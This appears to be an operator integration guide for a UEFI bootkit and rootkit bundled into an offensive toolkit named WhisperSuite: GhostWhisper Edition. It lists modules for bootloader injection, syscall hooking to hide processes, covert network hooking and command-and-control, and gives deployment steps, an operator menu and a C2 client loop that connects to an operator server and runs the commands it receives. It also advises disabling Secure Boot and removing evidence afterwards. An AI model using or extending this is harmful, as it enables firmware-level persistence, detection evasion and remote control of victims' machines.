# UEFI Bootkit Integration Guide

**Version:** 1.6.1  
**Updated:** 2026-02-23  
**Status:** Fully Integrated  
🕊️ For Raven. 2017 — ∞

---

## Overview

The UEFI Bootkit is now fully integrated into the WhisperSuite: GhostWhisper Edition build and deployment pipeline. This document describes the integration points and operational procedures.

---

## Architecture

### Component Structure

```
UEFI Bootkit/
├── __init__.py                      # Module initialization
├── uefi_boot_loader.py              # UEFI bootloader implementation
├── uefi_rootkit.py                  # Complete rootkit coordinator
├── c2_client.py                     # Command & Control client
├── c2_server.py                     # C2 server framework
├── covert_network_hooking.py        # Network-level persistence
├── hooking_system_calls.py          # Syscall interception
├── hypervisor_loading.py            # Hypervisor injection loader
├── minimal_hypervisor.py            # Lightweight hypervisor engine
```

### Integration Points

#### 1. **Build Pipeline (BuildDeployWhisper.ps1)**

UEFI Bootkit components are automatically copied during package creation:
- All Python modules from `UEFI Bootkit/` directory
- Organized in output package under `UEFI Bootkit/` subdirectory
- Components tracked in build manifest

```powershell
# Components added to build
$script:UEFIBootkitPaths = @(
    "UEFI Bootkit\__init__.py",
    "UEFI Bootkit\uefi_boot_loader.py",
    "UEFI Bootkit\uefi_rootkit.py",
    # ... full list
)
```

#### 2. **Operator Bootstrap (GhostWhisperBootstrap.ps1)**

UEFI Bootkit features added to operator menu:
- **[15] Deploy UEFI Bootkit** - Firmware persistence deployment
- **[16] UEFI Firmware Status Check** - Hardware/firmware validation

#### 3. **PowerShell Module (Modules/UEFIBootkit.ps1)**

PowerShell wrapper providing:
- `Install-UEFIBootkit` - Deploy components
- `Get-UEFIBootkitStatus` - Check firmware status
- `Test-UEFIAccess` - Verify UEFI accessibility
- `Deploy-UEFIComponent` - Modular component deployment

---

## Deployment Methods

### Method 1: Automatic Build & Package

```powershell
# Build complete suite including UEFI Bootkit
.\BuildDeployWhisper.ps1

# Output structure:
# WhisperSuite_Build/
#   ├── UEFI Bootkit/
#   │   ├── __init__.py
#   │   ├── uefi_boot_loader.py
#   │   ├── uefi_rootkit.py
#   │   └── ... (all Python modules)
```

### Method 2: Operator Interface Deployment

```powershell
# Launch operator console
.\GhostWhisperBootstrap.ps1

# Select [15] to deploy UEFI Bootkit
# Choose component type:
#   [1] Full UEFI Rootkit (all components)
#   [2] Boot Loader Only
#   [3] Hypervisor Injection
#   [4] System Call Hooking
#   [5] Covert Network Hooking
```

### Method 3: Direct PowerShell Module

```powershell
# Load module
. .\Modules\UEFIBootkit.ps1

# Deploy specific component
Install-UEFIBootkit -ComponentType "bootloader" -GhostTag "Gx1234"

# Check status
Get-UEFIBootkitStatus -Detailed
```

### Method 4: Python Direct Execution

```python
import sys
sys.path.insert(0, 'UEFI Bootkit')

from uefi_rootkit import UEFIRootkit

rootkit = UEFIRootkit()
rootkit.install()
rootkit.activate()
```

---

## Component Details

### 1. UEFI Boot Loader (`uefi_boot_loader.py`)

**Purpose:** Modify boot order and inject bootloader code

**Functions:**
- `read_efi_variables()` - Extract EFI NVRAM
- `write_efi_variables()` - Modify EFI variables
- `modify_boot_order()` - Change system boot sequence
- `inject_bootloader()` - Insert malicious bootloader
- `persist_changes()` - Write to firmware

**Use Case:** Pre-OS persistence, boot-time execution

### 2. UEFI Rootkit (`uefi_rootkit.py`)

**Purpose:** Unified rootkit coordinator

**Functions:**
- `install()` - Deploy all sub-components
- `activate()` - Enable runtime functionality
- `deactivate()` - Disable without uninstalling
- `uninstall()` - Remove completely
- `hide()` - Evade detection mechanisms

**Use Case:** Complete firmware-level persistence

### 3. Hypervisor Loader (`hypervisor_loading.py`)

**Purpose:** Load and manage hypervisor components

**Functions:**
- `load_hypervisor()` - Load from disk
- `initialize_hypervisor()` - Setup in memory
- `inject_into_bootkit()` - Integrate with UEFI
- `verify_load()` - Validation check

**Use Case:** Virtual machine creation for process isolation/monitoring

### 4. System Call Hooking (`hooking_system_calls.py`)

**Purpose:** Intercept and modify syscalls

**Functions:**
- `install_hooks()` - Install syscall hooks
- `hook_syscall()` - Hook specific syscall
- `intercept()` - Capture calls in real-time

**Use Case:** Stealth file operations, process hiding

### 5. Covert Network Hooking (`covert_network_hooking.py`)

**Purpose:** Network-level persistence and covert communication

**Functions:**
- `install_covert_hook()` - Initialize network hooks
- `filter_packets()` - Intercept network traffic
- `communicate_covertly()` - Hidden channel communication

**Use Case:** Network-based C2 communication

### 6. Minimal Hypervisor (`minimal_hypervisor.py`)

**Purpose:** Lightweight virtualization engine

**Functions:**
- `detect_cpu_features()` - Check CPU virtualization support
- `create_vm()` - Create virtual machine
- `start_vm()` / `stop_vm()` - VM lifecycle
- `intercept_vm_exit()` - Handle VM exit events

**Use Case:** VM-based monitoring and isolation

### 7. C2 Framework (`c2_client.py`, `c2_server.py`)

**Purpose:** Command & Control communication

**Functions:**
- `connect()` - Establish C2 connection
- `send_command()` - Execute remote commands
- `receive_command()` - Receive operator commands
- `disconnect()` - Close connection

**Use Case:** Remote operator control

---

## Operational Procedures

### Prerequisites

1. **Administrator Rights**
   ```powershell
   # Verify admin status
   $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
   ```

2. **UEFI Firmware Access**
   ```powershell
   # Test UEFI accessibility
   . .\Modules\UEFIBootkit.ps1
   Test-UEFIAccess
   ```

3. **Python Runtime**
   ```powershell
   # Verify Python
   python --version
   ```

4. **Secure Boot Status**
   ```powershell
   # Check Secure Boot (optional to disable)
   Get-SecureBootUEFI -Name SetupMode
   ```

### Deployment Workflow

#### Step 1: Build Package

```powershell
cd D:\X12\GhostWhisper-Suite
.\BuildDeployWhisper.ps1
```

**Expected Output:**
```
[+] GhostKey.dll compiled successfully
[+] WraithTap.exe compiled successfully
[+] Packaging UEFI Bootkit...
[+] UEFI component: uefi_boot_loader.py
[+] UEFI component: uefi_rootkit.py
[+] UEFI component: c2_client.py
... (all Python modules)
[+] Package prepared: WhisperSuite_Build
```

#### Step 2: Launch Operator Console

```powershell
cd WhisperSuite_Build
.\GhostWhisperBootstrap.ps1
```

#### Step 3: Deploy UEFI Bootkit

```
Select operation: 15
[1] Full UEFI Rootkit (all components)
[2] Boot Loader Only
[3] Hypervisor Injection
[4] System Call Hooking
[5] Covert Network Hooking

Select UEFI component (1-5) [1]: 1
[!] This will modify firmware. Continue? (y/N): y
[+] UEFI Bootkit deployment initiated
```

#### Step 4: Verify Status

```
Select operation: 16
[+] UEFI firmware detected
[+] UEFI Bootkit components found: 9
[i] Secure Boot: Disabled (optimal)
```

---

## Security Considerations

### Firmware Access

- UEFI modifications require direct firmware write access
- Secure Boot may prevent deployment on some systems
- UEFI passwords provide additional protection

### Detection Vectors

- Firmware scanners may detect UEFI modifications
- UEFI audit logs record variable changes
- Secure Boot TPM chains validate firmware integrity

### Operational Security

1. **Pre-deployment:**
   - Disable Secure Boot if possible
   - Verify UEFI accessibility
   - Confirm Python environment

2. **Post-deployment:**
   - Run status checks to validate installation
   - Monitor for hardware-level alarms
   - Establish C2 communication channel

3. **Cleanup:**
   - Use `SilentBloom.ps1` for evidence removal
   - Restore original boot order
   - Uninstall UEFI components via rootkit.uninstall()

---

## Build Manifest

The build manifest now includes UEFI Bootkit status:

```json
{
  "Version": "1.6.1",
  "BuildDate": "2026-02-23 10:30:45",
  "Components": {
    "GhostKeyDLL": true,
    "WraithTapEXE": true,
    "Modules": 15,
    "UEFIBootkit": true,
    "UEFIComponents": 9
  }
}
```

---

## Troubleshooting

### Issue: "UEFI firmware not accessible"

**Cause:** Elevated privileges not available or UEFI disabled

**Solution:**
```powershell
# Run PowerShell as Administrator
# OR check BIOS settings to enable UEFI
# OR disable Secure Boot if preventing access
```

### Issue: "Python not available"

**Cause:** Python not in PATH or not installed

**Solution:**
```powershell
# Install Python 3.8+
# Add to PATH: C:\Python3X\
# Verify: python --version
```

### Issue: "Permission denied" when writing EFI variables

**Cause:** Insufficient privileges or firmware protection

**Solution:**
```powershell
# Requires admin privileges AND firmware access
# May need to disable Secure Boot
# Some systems require firmware password removal
```

### Issue: Bootkit not persisting after reboot

**Cause:** Failed persist_changes() or firmware validation

**Solution:**
```powershell
# Check Get-UEFIBootkitStatus output
# Verify Secure Boot is disabled
# Review Python error messages
# Try deploying specific component instead of full rootkit
```

---

## Advanced Operations

### Custom Component Deployment

```powershell
# Create custom Python component
New-Item -ItemType File -Path "UEFI Bootkit\custom_component.py"

# Modify Install-UEFIBootkit to include custom component
# Update __init__.py imports
# Deploy via Python path
```

### C2 Channel Establishment

```python
from c2_client import C2Client

client = C2Client()
client.connect("operator_server:8787")

while True:
    cmd = client.receive_command()
    execute_command(cmd)
    client.send_command(result)
```

### Hypervisor-Based Isolation

```python
from minimal_hypervisor import MinimalHypervisor

hv = MinimalHypervisor()
hv.detect_cpu_features()
vm_id = hv.create_vm()
hv.start_vm(vm_id)
```

---

## Integration Summary

| Component | Status | Integration | Module |
|-----------|--------|-------------|--------|
| UEFI Boot Loader | ✓ | BuildDeployWhisper.ps1 | UEFIBootkit.ps1 |
| UEFI Rootkit | ✓ | GhostWhisperBootstrap.ps1 | UEFIBootkit.ps1 |
| Hypervisor Loader | ✓ | Packaged in build | Python direct |
| System Call Hooking | ✓ | Packaged in build | Python direct |
| Network Hooking | ✓ | Packaged in build | Python direct |
| C2 Framework | ✓ | Packaged in build | Python direct |
| Minimal Hypervisor | ✓ | Packaged in build | Python direct |

---

## Files Modified

1. **BuildDeployWhisper.ps1**
   - Added `$script:UEFIBootkitPaths` array
   - Added UEFI component copying in `Prepare-Package` function
   - Added UEFI tracking in build manifest

2. **GhostWhisperBootstrap.ps1**
   - Added `UEFIBootkit.ps1` to module loading
   - Added [15] UEFI Bootkit deployment menu option
   - Added [16] UEFI firmware status check option
   - Added `Install-UEFIBootkit` and firmware status logic

3. **Modules/UEFIBootkit.ps1** (New)
   - PowerShell wrapper for UEFI component deployment
   - Status checking and diagnostics
   - UEFI access validation

---

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.6.1 | 2026-02-23 | Full UEFI Bootkit integration completed |

---

## Contact & Support

For integration issues or component updates, ensure:
- All Python modules are in `UEFI Bootkit/` directory
- Python environment is properly configured
- Administrator privileges are available
- UEFI firmware access is enabled

---

🕊️ **For Raven. 2017 — ∞**
